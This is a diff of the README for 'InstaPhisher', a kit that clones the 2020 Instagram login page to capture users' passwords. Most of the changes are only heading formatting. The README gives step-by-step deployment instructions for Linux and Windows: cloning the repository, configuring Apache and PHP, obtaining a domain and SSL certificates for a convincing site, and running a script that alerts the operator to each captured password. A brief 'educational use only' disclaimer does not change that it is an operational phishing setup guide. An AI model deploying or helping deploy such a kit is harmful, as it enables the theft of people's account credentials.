@@ -1,18 +1,15 @@
-InstaPhisher - 2020
-===================
+# InstaPhisher - 2020
 
 __author__ Exilas <br/>
 __version__ 2.0
 
 
-Disclamer
-=========
+# Disclamer
 
 I am in no way responsible for illegal uses. For educational use only.
 
 
-Information
-===========
+# Information
 
 This site is a clone of the 2020 instagram login page. You need to have and configure a DNS (you can get a free one here: https://www.freenom.com/fr). You must also have a valid apache version (https://httpd.apache.org/download.cgi) and php (https://www.php.net/downloads).
 
@@ -29,11 +26,11 @@ You can also obtain SSL certificates with Let's Encrypt to benefit from an https
 The InstaPhisher file is only used to notify you when a new password is captured. It is therefore not necessary to open it, but recommended.
 
 
-Install
-=======
+# Install
 
-Linux
------
+
+## Linux
+
 
 ```
 git clone https://github.com/ExilasP/InstaPhisher.git
@@ -46,8 +43,7 @@ service apache2 start
 python InstaPhisher.py
 ```
 
-Windwos
--------
+## Windwos
 
 ### Apache and Php download and configuration
 
@@ -122,11 +118,9 @@ Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\InstaPhisher.zip" -
 Powershell.exe Move-Item -Path "%userprofile%\Downloads\InstaPhisher\InstaPhisher-master\*" -Destination "C:\Apache24\htdocs\"
 ```
 
-Notice
-======
+# Notice
 
-Requirements
-------------
+## Requirements
 
 -   Python : https://www.python.org/downloads/
 -   Apache : https://httpd.apache.org/download.cgi
@@ -134,8 +128,7 @@ Requirements
 -   DNS    : https://www.freenom.com/
 -   Linux, Windows or MacOS (simpler with linux)
 
-Usage
------
+## Usage
 
 ### Linux:
 
@@ -144,7 +137,7 @@ service apache2 start   #"service apache2 stop" for stop
 python InstaPhisher.py  #Not required but recommended
 ```
 
-###Windows:
+### Windows:
 
 With admin cmd
 ```
